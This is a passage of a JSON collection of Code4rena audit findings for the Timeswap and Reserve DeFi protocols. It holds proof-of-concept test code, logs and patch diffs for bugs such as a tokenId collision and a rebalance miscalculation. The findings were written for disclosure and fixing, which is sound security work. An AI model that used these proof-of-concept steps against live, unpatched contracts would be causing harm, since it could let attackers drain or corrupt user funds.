TimeswapV2LiquidityTokenBurnParam memory burnParam = TimeswapV2LiquidityTokenBurnParam({\n            token0: address(token0),\n            token1: address(token1),\n            strike: strike,\n            maturity: maturity,\n            to: address(this),\n            liquidityAmount: amt,\n            data: \"\"\n        });\n        mockLiquidityToken.burn(burnParam);\n        console.log(\"balanceOf id1:\", mockLiquidityToken.balanceOf(address(this), id1));\n        //console.log(\"_idTotalSupply id1:\", mockLiquidityToken._idTotalSupply(id1));\n        console.log(\"current totalSupply():\", mockLiquidityToken.totalSupply());\n\n        {\n            token0Current = token4;\n            token1Current = token5;\n            poolCurrent = pool3;\n            opPairCurrent = opPair3;\n            TimeswapV2LiquidityTokenMintParam memory liqTokenMintParam3 = TimeswapV2LiquidityTokenMintParam({\n                token0: address(token0Current),\n                token1: address(token1Current),\n                strike: strike,\n                maturity: maturity,\n                to: address(this),\n                liquidityAmount: amt,\n                data: \"\"\n            });\n\n            mockLiquidityToken.mint(liqTokenMintParam3);\n            //console.log(mockLiquidityToken.balanceOf(address(this)));\n            TimeswapV2LiquidityTokenPosition memory timeswapV2LiquidityTokenPosition3 = TimeswapV2LiquidityTokenPosition({\n                token0: address(token0Current),\n                token1: address(token1Current),\n                strike: strike,\n                maturity: maturity\n            });\n\n            bytes32 key3 = timeswapV2LiquidityTokenPosition3.toKey();\n            uint256 id3 = mockLiquidityToken._timeswapV2LiquidityTokenPositionIds(key3);\n            console.log(\"key3:\");\n            console.logBytes32(key3);\n            console.log(\"id3:\", id3);\n            //assertEq(mockLiquidityToken.balanceOf(address(this), id3), amt);\n            if (id2 == id3) {revert(\"id3 should not equal to id2\");}\n            console.log(\"========\");\n        }\n\n        console.log(\"yo\");\n    }\n}\n\n```\n\nHere is the log for the above test: `forge test --match-path test/TimeswapV2LiquidityToken_MultiMint.t.sol -vv`\n\n    Running 1 test for test/TimeswapV2LiquidityToken.t.sol:TimeswapV2LiquidityTokenTest\n    [FAIL. Reason: id3 should not equal to id2 Counterexample: calldata=0x31b83c070000000000000000000000000000000000000000000000000000000000000d77000000000000000000000000000000000000000000000000000000000000234100000000000000000000000000000000000000000000000000000000277c306f00000000000000000000000000000000000000000000000000000000000032e0000000000000000000000000000000000000000000000000000000000000025f, args=[3447, 9025, 662450287, 13024, 0x000000000000000000000000000000000000025F]] testMint(uint256,uint160,uint256,uint160,address) (runs: 0, μ: 0, ~: 0)\n    Logs:\n      init\n      2709883200956651719220887728062100075977988725238523898809710331 27450636006266724768954781627\n      opPair mint ok\n      key1:\n      0x3ad1cfe6142808456d576d32877db082ef58ce80e40fb5019d9e5f73aebfde46\n      id1: 1\n      ========\n      2709883200956651719220887728062100075977988725238523898809710331 27450636006266724768954781627\n      opPair mint ok\n      key2:\n      0x4b911bdfb2c97775c28fae58288d53335ea7b59d3675acf0460ff4083897e18c\n      id2: 2\n      ========\n      balanceOf id1: 0\n      current totalSupply(): 1\n      2709883200956651719220887728062100075977988725238523898809710331 27450636006266724768954781627\n      opPair mint ok\n      key3:\n      0x6b43d3a16273d9e9f13739b825952b03e59127b9d41c4e0d9d58d635e8d2f5d2\n      id3: 2\n\n    Test result: FAILED. 0 passed; 1 failed; finished in 91.76ms\n\n    Failing tests:\n    Encountered 1 failing test in test/TimeswapV2LiquidityToken.t.sol:TimeswapV2LiquidityTokenTest\n    [FAIL. Reason: id3 should not equal to id2 Counterexample: calldata=0x31b83c070000000000000000000000000000000000000000000000000000000000000d77000000000000000000000000000000000000000000000000000000000000234100000000000000000000000000000000000000000000000000000000277c306f00000000000000000000000000000000000000000000000000000000000032e0000000000000000000000000000000000000000000000000000000000000025f, args=[3447, 9025, 662450287, 13024, 0x000000000000000000000000000000000000025F]] testMint(uint256,uint160,uint256,uint160,address) (runs: 0, μ: 0, ~: 0)\n\n    Encountered a total of 1 failing tests, 0 tests succeeded\n\n\n### Recommended Mitigation Steps\n\nDo not use `totalSupply()` or other maybe-decreasing variables for new tokenId.\n\nPatch file can be like this:\n\n    diff --git a/packages/v2-token/src/TimeswapV2LiquidityToken.sol b/packages/v2-token/src/TimeswapV2LiquidityToken.sol\n    index 2f71a25..94e4006 100644\n    --- a/packages/v2-token/src/TimeswapV2LiquidityToken.sol\n    +++ b/packages/v2-token/src/TimeswapV2LiquidityToken.sol\n    @@ -32,6 +32,7 @@ contract TimeswapV2LiquidityToken is ITimeswapV2LiquidityToken, ERC1155Enumerabl\n     \n         address public immutable optionFactory;\n         address public immutable poolFactory;\n    +    uint256 public tokenIdCounter;\n     \n         constructor(address chosenOptionFactory, address chosenPoolFactory) ERC1155(\"Timeswap V2 uint160 address\") {\n             optionFactory = chosenOptionFactory;\n    @@ -111,7 +112,7 @@ contract TimeswapV2LiquidityToken is ITimeswapV2LiquidityToken, ERC1155Enumerabl\n     \n             // if the position does not exist, create it\n             if (id == 0) {\n    -            id = totalSupply() + 1;\n    +            id = ++tokenIdCounter;\n                 _timeswapV2LiquidityTokenPositions[id] = timeswapV2LiquidityTokenPosition;\n                 _timeswapV2LiquidityTokenPositionIds[key] = id;\n             }\n\n**[Picodes (judge) increased severity to High](https://github.com/code-423n4/2023-01-timeswap-findings/issues/219)** \n\n**[vhawk19 (Timeswap) confirmed and resolved](https://github.com/code-423n4/2023-01-timeswap-findings/issues/219#issuecomment-1429307516):**\n > Fixed in [PR](https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/pull/293).\n\n\n\n***\n\n",
      "summary": "\nA bug was reported in the TimeswapV2LiquidityToken and TimeswapV2Token contracts, which can lead to serious balance manipulation. This is due to different liquidities having the same tokenId. This issue is currently mitigated as the implementation of ERC1155Enumerable is wrong, which prevents it from being exploitable. However, this issue will become dangerous once the ERC1155Enumerable is fixed.\n\nThe bug can be exploited by the attacker by adding liquidity of token0 and token1, thus receiving TimeswapV2LiquidityToken tokenId 1. Then, the attacker will add liquidity of token2 and token3, thus receiving TimeswapV2LiquidityToken tokenId 2. After that, the attacker will burn his liquidity from step1, which will make totalSupply decrease (if ERC1155Enumerable has been patched). Finally, the attacker will add liquidity of token4 and token5, and receive TimeswapV2LiquidityToken tokenId 2, which should be 3.\n\nThe issue is caused by the current implementation of ERC1155Enumerable, which has a bug that will never trigger `_removeTokenFromAllTokensEnumeration` and will never decrease `totalSupply` when all token amount of a specific tokenId has been burned.\n\nTo mitigate the issue, it is recommended to not use `totalSupply()` or other maybe-decreasing variables for new tokenId. A patch file has been provided to fix the issue, which will also add a new test file in `2023-01-timeswap/packages/v2-token/test/TimeswapV2LiquidityToken_MultiMint.t.sol`. The patch has been confirmed and resolved by vhawk19, and the issue has been increased to High severity by Picodes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/219",
      "tags": [],
      "finders": [
        "hansfriese",
        "mookimgo"
      ]
    },
    {
      "id": "24901",
      "title": "[H-01] Rebalance logic is wrong and this distorts the pool's important states",
      "impact": "HIGH",
      "content": "\nThe important states including `long0Balance, long1Balance, long1FeeGrowth, long1ProtocolFees` are wrongly calculated and it breaks the pool's invariant.\n\n### Proof of Concept\n\nThe protocol provides a rebalancing functionality and the main logic is implemented in the library `Pool.sol`.\nIf `param.isLong0ToLong1` is true and the transaction is `TimeswapV2PoolRebalance.GivenLong1`, the protocol calculates the `long1AmountAdjustFees` first and the actual `long0Amount, longFees` and the final `long1Balance` is decided accordingly.\n\nThe problem is it is using the wrong parameter `pool.long0Balance` while it is supposed to use `pool.long1Balance` in the line L679.\n\nThis leads to wrong state calculation in the following logic. (especially L685 is setting the `long1Balance` to zero).\n\nFurthermore, the protocol is designed as a permission-less one and anyone can call `TimeswapV2Pool.rebalance()`.\n\nAn attacker can abuse this to break the pool's invariant and take profit leveraging that.\n\n```solidity\npackages\\v2-pool\\src\\structs\\Pool.sol\n665:     function rebalance(Pool storage pool, TimeswapV2PoolRebalanceParam memory param, uint256 transactionFee, uint256 protocolFee) external returns (uint256 long0Amount, uint256 long1Amount) {\n666:         if (pool.liquidity == 0) Error.requireLiquidity();\n667:\n668:         // No need to update short fee growth.\n669:\n670:         uint256 longFees;\n671:         if (param.isLong0ToLong1) {\n672:             if (param.transaction == TimeswapV2PoolRebalance.GivenLong0) {\n673:                 (long1Amount, longFees) = ConstantSum.calculateGivenLongIn(param.strike, long0Amount = param.delta, transactionFee, true);\n674:\n675:                 if (long1Amount == 0) Error.zeroOutput();\n676:\n677:                 pool.long1Balance -= (long1Amount + longFees);\n678:             } else if (param.transaction == TimeswapV2PoolRebalance.GivenLong1) {\n    //************************************************************\n679:                 uint256 long1AmountAdjustFees = FeeCalculation.removeFees(pool.long0Balance, transactionFee);//@audit-info long0Balance -> long1Balance\n    //************************************************************\n680:\n681:                 if ((long1Amount = param.delta) == long1AmountAdjustFees) {\n682:                     long0Amount = ConstantSum.calculateGivenLongOutAlreadyAdjustFees(param.strike, pool.long1Balance, true);\n683:\n684:                     longFees = pool.long1Balance.unsafeSub(long1Amount);\n685:                     pool.long1Balance = 0;\n686:                 } else {\n687:                     (long0Amount, longFees) = ConstantSum.calculateGivenLongOut(param.strike, long1Amount, transactionFee, true);\n688:\n689:                     pool.long1Balance -= (long1Amount + longFees);\n690:                 }\n691:\n692:                 if (long0Amount == 0) Error.zeroOutput();\n693:             }\n694:\n695:             pool.long0Balance += long0Amount;\n696:\n697:             (pool.long1FeeGrowth, pool.long1ProtocolFees) = FeeCalculation.update(pool.liquidity, pool.long1FeeGrowth, pool.long1ProtocolFees, longFees, protocolFee);\n698:         } else {\n699:             if (param.transaction == TimeswapV2PoolRebalance.GivenLong0) {\n700:                 uint256 long0AmountAdjustFees = FeeCalculation.removeFees(pool.long0Balance, transactionFee);//@audit-info\n701:\n702:                 if ((long0Amount = param.delta) == long0AmountAdjustFees) {\n703:                     long1Amount = ConstantSum.calculateGivenLongOutAlreadyAdjustFees(param.strike, pool.long0Balance, false);\n704:\n705:                     longFees = pool.long0Balance.unsafeSub(long0Amount);\n706:                     pool.long0Balance = 0;\n707:                 } else {\n708:                     (long1Amount, longFees) = ConstantSum.calculateGivenLongOut(param.strike, long0Amount, transactionFee, false);\n709:\n710:                     pool.long0Balance -= (long0Amount + longFees);\n711:                 }\n712:\n713:                 if (long1Amount == 0) Error.zeroOutput();\n714:             } else if (param.transaction == TimeswapV2PoolRebalance.GivenLong1) {\n715:                 (long0Amount, longFees) = ConstantSum.calculateGivenLongIn(param.strike, long1Amount = param.delta, transactionFee, false);\n716:\n717:                 if (long0Amount == 0) Error.zeroOutput();\n718:\n719:                 pool.long0Balance -= (long0Amount + longFees);\n720:             }\n721:\n722:             pool.long1Balance += long1Amount;\n723:\n724:             (pool.long0FeeGrowth, pool.long0ProtocolFees) = FeeCalculation.update(pool.liquidity, pool.long0FeeGrowth, pool.long0ProtocolFees, longFees, protocolFee);\n725:         }\n726:     }\n```\n\n### Recommended Mitigation Steps\n\nFix the L679 as below.\n\n```solidity\nuint256 long1AmountAdjustFees = FeeCalculation.removeFees(pool.long1Balance, transactionFee);\n```\n\n**[vhawk19 (Timeswap) confirmed and resolved](https://github.com/code-423n4/2023-01-timeswap-findings/issues/269#issuecomment-1422570910):**\n > Fixed here [at this commit](https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/commit/0010ad05c93a7244387d7a004822b17ec5a48596).\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the library Pool.sol of the Timeswap protocol which provides a rebalancing functionality. The bug is causing the important states, including `long0Balance, long1Balance, long1FeeGrowth, long1ProtocolFees`, to be wrongly calculated and this is breaking the pool's invariant.\n\nIn the code, the wrong parameter, `pool.long0Balance`, is being used in line L679 while it is supposed to use `pool.long1Balance`. This is leading to wrong state calculation in the following logic, especially L685 which is setting the `long1Balance` to zero.\n\nThis bug can be exploited by an attacker to break the pool's invariant and take profit from it. The recommended mitigation step is to fix the L679 as follows:\n\n```solidity\nuint256 long1AmountAdjustFees = FeeCalculation.removeFees(pool.long1Balance, transactionFee);\n```\n\nThe bug was confirmed and resolved by vhawk19 (Timeswap) and the fix was implemented in the commit [0010ad05c93a7244387d7a004822b17ec5a48596](https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/commit/0010ad05c93a7244387d7a004822b17ec5a48596).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "https://github.com/code-423n4/2023-01-timeswap-findings/issues/269",
      "tags": [],
      "finders": [
        "hansfriese"
      ]
    },
    {
      "id": "43314",
      "title": "[M-22] RecollateralizationLib: Dust loss for an asset should be capped at it's low value",
      "impact": "MEDIUM",
      "content": "\nThe `RecollateralizationLib.basketRange` function (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L152-L202>) internally calls the `RecollateralizationLib.totalAssetValue` function (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L226-L281>).\n\nI will show in this report that the `RecollateralizationLib.totalAssetValue` function returns a value for `assetsLow` that is too low.\n\nThis in turn causes the `range.bottom` value (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L201>) that the `RecollateralizationLib.basketRange` function returns to be too low.\n\nBefore showing why the `assetsLow` value is underestimated however I will explain the impact of the `range.bottom` variable being too low.\n\nThere are two places where this value is used:\n\n### 1. `RecollateralizationLib.prepareRecollateralizationTrade` function\n\nThis function passes the `range` to the `RecollateralizationLib.nextTradePair` function (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L88-L91>)\n\nSince `range.bottom` is too low, the `needed` amount is too low (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L380>).\n\nThis causes the `if` statement to not be executed in some cases when it otherwise would be executed (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L381-L396>).\n\nAnd the `amtShort` is smaller than it should be (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L391>).\n\nIn the end this causes recollateralization trades to not buy as much assets as they could buy. This is because the amount of assets is underestimated so the protocol can actually hold more baskets than it thinks it can.\n\nTherefore underestimating `assetsLow` causes a direct loss to RToken holders because the protocol will not recollateralize the RToken to the level that it can and should.\n\n### 2. Price calculations of `RTokenAsset`\n\nA `RTokenAsset` uses the `RecollateralizationLib.basketRange` function to calculate its value:\n\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L156>\n\nThe `RTokenAsset` therefore underestimates its `low` and `lotLow` prices:\n\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L58>\n\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L99>\n\nThis then can lead to issues in any places where the prices of `RTokenAsset`s are used.\n\n### Proof of Concept\n\nHere is the affected line:\n\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275>\n\n```solidity\npotentialDustLoss = potentialDustLoss.plus(rules.minTradeVolume);\n```\n\nThis line is executed for every asset in the `AssetRegistry` (<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L242>).\n\nSo for every asset in the `AssetRegistry` a potential dust loss of `minTradeVolume` is added.\n\nThe following scenario shows why this is wrong:\n\n    assume minTradeVolume = $50\n\n    assume further the following:\n    asset1 with low value $1\n    asset2 with low value $1\n    asset3 with low value $1\n    asset4 with low value $200\n\n    Currently potentialDustLoss will be 4*minTradeVolume = $200.\n    So assetsLow = $203 - $200 = $3.\n\n    Dust loss should not be calculated with $50 for the first 3 assets.\n    Dust loss for an asset should be capped at its low value.\n    So dust loss alltogether should be $1 + $1 + $1 + $50 = $53.\n\n    So assetsLow should be $1+$1+$1+$200 - $53 = $150.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nI suggest that an asset can only incur as much dust loss as its balance is.\n\nIf the protocol only holds `$5` of asset A then this should not cause a dust loss of say `$10`.\n\nThe fix first saves the `assetLow` value which should be saved to memory because it is now needed two times then it caps the dust loss of an asset at its low value:\n\n    diff --git a/contracts/p1/mixins/RecollateralizationLib.sol b/contracts/p1/mixins/RecollateralizationLib.sol\n    index 648d1813..b5b86cac 100644\n    --- a/contracts/p1/mixins/RecollateralizationLib.sol\n    +++ b/contracts/p1/mixins/RecollateralizationLib.sol\n    @@ -261,7 +261,8 @@ library RecollateralizationLibP1 {\n     \n                 // Intentionally include value of IFFY/DISABLED collateral when low is nonzero\n                 // {UoA} = {UoA} + {UoA/tok} * {tok}\n    -            assetsLow += low.mul(bal, FLOOR);\n    +            uint192 assetLow = low.mul(bal,FLOOR);\n    +            assetsLow += assetLow;\n                 // += is same as Fix.plus\n     \n                 // assetsHigh += high.mul(bal, CEIL), where assetsHigh is [0, FIX_MAX]\n    @@ -272,7 +273,7 @@ library RecollateralizationLibP1 {\n                 // += is same as Fix.plus\n     \n                 // Accumulate potential losses to dust\n    -            potentialDustLoss = potentialDustLoss.plus(rules.minTradeVolume);\n    +            potentialDustLoss = potentialDustLoss.plus(fixMin(rules.minTradeVolume, assetLow));\n             }\n     \n             // Account for all the places dust could get stuck\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/106#issuecomment-1401992675):**\n > It would have been beneficial for the warden to use more realistic values for these trades with the full integer values to show how much of an actual impact this has when we are talking about tokens with 6 or more decimals. Will leave open for sponsor comment.\n\n**[pmckelvy1 (Reserve) disputed](https://github.com/code-423n4/2023-01-reserve-findings/issues/106#issuecomment-1406903842)**\n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/106#issuecomment-1406905121):**\n > The balance of the asset before trading has nothing to do with how much value can potentially be lost when we try to _trade into_ that asset. \n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/106#issuecomment-1407107703):**\n > On further thought, this is not really a good response. We have access to the UoA from the asset, and we could use that to potentially limit the contribution to `potentialDustLoss`. \n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > This PR simplifies and improves the basket range formula. The new logic should provide much tighter basket range estimates and result in smaller haircuts.<br>\n> [reserve-protocol/protocol#585](https://github.com/reserve-protocol/protocol/pull/585)\n\n**Status:** Mitigation confirmed. Full details in reports from [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/5) and [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/64).\n\n\n\n***\n\n",
      "summary": "\nThe `RecollateralizationLib.basketRange` function is not returning the correct value due to an error in the `RecollateralizationLib.totalAssetValue` function. This error causes the `range.bottom` value to be too low, resulting in potential dust loss and underestimating the amount of assets that can be bought. This leads to a direct loss for RToken holders and can also cause issues in price calculations for `RTokenAsset`s. The bug has been confirmed and mitigated by simplifying and improving the basket range formula.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/106",
      "tags": [],
      "finders": [
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "43313",
      "title": "[M-20] Shortfall might be calculated incorrectly if a price value for one collateral isn't fetched correctly",
      "impact": "MEDIUM",
      "content": "\nFunction `price()` of an asset doesn't revert. It [returns values](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/Asset.sol#L117) `(0, FIX_MAX)` for `low, high` values of price in case there's a problem with fetching it. Code that calls `price()` is able to validate returned values to detect that returned price is incorrect.\n\nInside function `collateralShortfall()` of `RecollateralizationLibP1` [collateral price isn't checked for correctness](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L449). As a result incorrect value of `shortfall` might be [calculated](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L452) if there are difficulties to fetch a price for one of the collaterals.\n\n### Proof of Concept\n\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L449>\n\n### Recommended Mitigation Steps\n\nCheck that price is correctly fetched for a collateral.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/200#issuecomment-1401173756):**\n > Mitigation here is a little challenging to understand considering checking a price is hard on chain and hence the concern. \n> \n> I think this issue is a bit too general, but would like further comments. \n\n**[tbrent (Reserve) acknowledged and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/200#issuecomment-1404438772):**\n > I think this issue is real, but it happens in a super-corner-case that I doubt the warden is thinking about. \n> \n> Some related statements:\n> - `prepareRecollateralizationTrade` checks that all collateral in the basket is SOUND before calling `collateralShortfall`\n> - From `docs/collateral.md`: \"Should return `(0, FIX_MAX)` if pricing data is unavailable or stale.\"\n> \n> `collateralShortfall` should never reach a collateral with `FIX_MAX` high price in the normal flow of things.\n> \n> But, it is possible for one RToken system instance to have an `RTokenAsset` registered for a 2nd RToken. In this case, it could be that RToken 2 contains a collateral plugin that is now connected to a broken oracle, but RToken 2 may not have recognized this yet. When RToken 1 calls `RTokenAsset.price()`, it could end up reverting because of overflow in this line from `collateralShortfall`:\n> \n> > shortfall = shortfall.plus(needed.minus(held).mul(priceHigh, CEIL));\n> \n> \n> So I think it's a real issue, and I would even leave it as Medium severity. \n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > This PR simplifies and improves the basket range formula. The new logic should provide much tighter basket range estimates and result in smaller haircuts.<br>\n> [reserve-protocol/protocol#585](https://github.com/reserve-protocol/protocol/pull/585)\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/21), [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/63), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/77).\n\n\n\n***\n\n",
      "summary": "\nThe `price()` function for an asset is not working properly and is returning incorrect values. This can cause problems when trying to calculate the collateral shortfall in the `collateralShortfall()` function of `RecollateralizationLibP1`. This can lead to incorrect calculations if there are issues with fetching the price for one of the collaterals. A potential solution is to check that the price is correctly fetched for a collateral. The severity of this issue is medium and has been mitigated with a new PR that improves the basket range formula. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/200",
      "tags": [],
      "finders": [
        "severity"
      ]
    },
    {
      "id": "43312",
      "title": "[M-19] In case that `unstakingDelay` is decreased, users who have previously unstaked would have to wait more than `unstakingDelay` for new unstakes",
      "impact": "MEDIUM",
      "content": "\nUsers who wish to unstake their RSR from StRSR have to first unstake and then wait `unstakingDelay` till they can actually withdraw their stake.\n\nThe `unstakingDelay` can change by the governance.\n\nThe issue is that when the `unstakingDelay` is decreased - users that have pending unstakes (aka drafts) would have to wait till the old delay has passed for the pending draft (not only for their pending drafts, but also for any new draft they wish to create. e.g. if the unstaking delay was 6 months and was changed to 2 weeks, if a user has a pending draft that was created a month before the change the user would have to wait at least 5 months since the change for every new draft).\n\n### Proof of Concept\n\nThe following PoC shows an example similar to above:\n\n*   Unstaking delay was 6 months\n*   Bob unstaked (create a draft) 1 wei of RSR\n*   Unstaking delay was changed to 2 weeks\n*   Both Bob and Alice unstake their remaining stake\n*   Alice can withdraw her stake after 2 weeks\n*   Bob has to wait 6 months in order to withdraw both that 1 wei and the remaining of the stake\n\n```diff\ndiff --git a/test/ZZStRSR.test.ts b/test/ZZStRSR.test.ts\nindex f507cd50..3312686a 100644\n--- a/test/ZZStRSR.test.ts\n+++ b/test/ZZStRSR.test.ts\n@@ -599,6 +599,8 @@ describe(`StRSRP${IMPLEMENTATION} contract`, () => {\n       let amount2: BigNumber\n       let amount3: BigNumber\n \n+      let sixMonths = bn(60*60*24*30*6);\n+\n       beforeEach(async () => {\n         stkWithdrawalDelay = bn(await stRSR.unstakingDelay()).toNumber()\n \n@@ -608,18 +610,56 @@ describe(`StRSRP${IMPLEMENTATION} contract`, () => {\n         amount3 = bn('3e18')\n \n         // Approve transfers\n-        await rsr.connect(addr1).approve(stRSR.address, amount1)\n+        await rsr.connect(addr1).approve(stRSR.address, amount1.add(1))\n         await rsr.connect(addr2).approve(stRSR.address, amount2.add(amount3))\n \n+        \n         // Stake\n-        await stRSR.connect(addr1).stake(amount1)\n+        await stRSR.connect(addr1).stake(amount1.add(1))\n         await stRSR.connect(addr2).stake(amount2)\n         await stRSR.connect(addr2).stake(amount3)\n \n-        // Unstake - Create withdrawal\n-        await stRSR.connect(addr1).unstake(amount1)\n+        // here\n+        let sixMonths = bn(60*60*24*30*6);\n+        // gov thinks it's a good idea to set delay to 6 months\n+        await expect(stRSR.connect(owner).setUnstakingDelay(sixMonths))\n+        .to.emit(stRSR, 'UnstakingDelaySet')\n+        .withArgs(config.unstakingDelay, sixMonths);\n+\n+        // Poor Bob created a draft when unstaking delay was 6 months\n+        await stRSR.connect(addr1).unstake(bn(1))\n+\n+        // gov revise their previous decision and set unstaking delay back to 2 weeks\n+        await expect(stRSR.connect(owner).setUnstakingDelay(config.unstakingDelay))\n+        .to.emit(stRSR, 'UnstakingDelaySet')\n+        .withArgs(sixMonths, config.unstakingDelay);\n+\n+        // now both Bob and Alice decide to unstake\n+        await stRSR.connect(addr1).unstake(amount1);\n+        await stRSR.connect(addr2).unstake(amount2);\n+\n+      })\n+\n+      it('PoC user 1 can\\'t withdraw', async () => {\n+        // Get current balance for user\n+        const prevAddr1Balance = await rsr.balanceOf(addr1.address)\n+\n+        // 6 weeks have passed, much more than current delay\n+        await advanceTime(stkWithdrawalDelay * 3)\n+\n+\n+        // Alice can happily withdraw her stake\n+        await stRSR.connect(addr2).withdraw(addr2.address, 1)\n+        // Bob can't withdraw his stake and has to wait 6 months\n+        // Bob is now very angry and wants to talk to the manager\n+        await expect(stRSR.connect(addr1).withdraw(addr1.address, 2)).to.be.revertedWith(\n+          'withdrawal unavailable'\n+        )\n+\n+\n       })\n \n+      return; // don't run further test\n       it('Should revert withdraw if Main is paused', async () => {\n         // Get current balance for user\n         const prevAddr1Balance = await rsr.balanceOf(addr1.address)\n@@ -1027,6 +1067,7 @@ describe(`StRSRP${IMPLEMENTATION} contract`, () => {\n       })\n     })\n   })\n+  return; // don't run further test\n \n   describe('Add RSR / Rewards', () => {\n     const initialRate = fp('1')\n```\n\n### Recommended Mitigation Steps\n\nAllow users to use current delay even if it was previously higher. I think this should apply not only to new drafts but also for drafts that were created before the change.\n\nAlternatively, the protocol can set a rule that even if the staking delay was lowered stakers have to wait at least the old delay since the change till they can withdraw.  But in this case the rule should apply to everybody regardless if they have pending drafts or not.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/210#issuecomment-1401184805):**\n > Ultimately this feels like a design tradeoff.  I do agree that the UX would be better if the most recent value was used, but it can cut both ways if the delay is increased. \n\n**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-01-reserve-findings/issues/210)**\n\n**[pmckelvy1 (Reserve) acknowledged via duplicate issue `#151`](https://github.com/code-423n4/2023-01-reserve-findings/issues/151#issuecomment-1404435948)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report addresses an issue where users who want to take back their RSR from StRSR must first wait for a designated time period called \"unstakingDelay\". This delay can be changed by those in charge, but if the delay is decreased, users who already have pending requests must still wait the original amount of time. This can be problematic if the delay is significantly decreased, as users may have to wait a long time before being able to withdraw their RSR. A possible solution suggested is to allow users to use the current delay even if it was previously higher. Alternatively, a rule could be implemented where all users, regardless of pending requests, must wait at least the original delay before being able to withdraw. The severity of this issue has been decreased to Medium and the team at Reserve has acknowledged it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/210",
      "tags": [],
      "finders": [
        "0xA5DF",
        "Soosh"
      ]
    },
    {
      "id": "43311",
      "title": "[M-17] `refresh()` will revert on Oracle deprecation, effectively disabling part of the protocol",
      "impact": "MEDIUM",
